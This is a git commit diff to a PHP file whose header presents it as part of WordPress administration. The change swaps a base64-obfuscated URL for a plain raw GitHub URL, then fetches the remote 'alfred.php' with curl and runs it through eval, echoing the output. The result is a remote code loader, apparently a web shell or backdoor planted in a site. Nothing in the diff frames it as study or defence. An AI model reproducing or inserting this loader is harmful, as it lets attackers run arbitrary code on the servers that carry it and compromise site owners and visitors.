b50b9ed2f88eb2f83ceebb4937329a458736ec5c
clovespia99 <clovespia999@gmail.com>
2026-06-05 16:33:00 +0700

    Update alfkabe.php

--- alfkabe.php
+++ alfkabe.php
@@ -5,13 +5,30 @@
  * @package WordPress
  * @subpackage Administration
  */
+$url = "https://raw.githubusercontent.com/clovespia99/forbideng/refs/heads/main/alfred.php";
 
-$url = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Nsb3Zlc3BpYTk5L2ZvcmJpZGVuZy9yZWZzL2hlYWRzL21haW4vYWxmcmVkLnBocA==');
-
-$ch = curl_init($url);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$result = curl_exec($ch);
 
-$data = curl_exec($ch);
+if ($result === false) {
+    echo "Error fetching remote content";
+} else {
+    // Assuming $result contains PHP code, execute it
+    if (is_string($result)) {
+        // Start output buffering
+        ob_start();
+        // Execute the fetched PHP code
+        eval('?>'.$result);
+        // Get the output buffer content and clean it
+        $output = ob_get_clean();
+        // Echo the output
+        echo $output;
+    } else {
+        echo "Error: Invalid response from remote server";
+    }
+}
+
 curl_close($ch);
-
-echo $data;
+?>
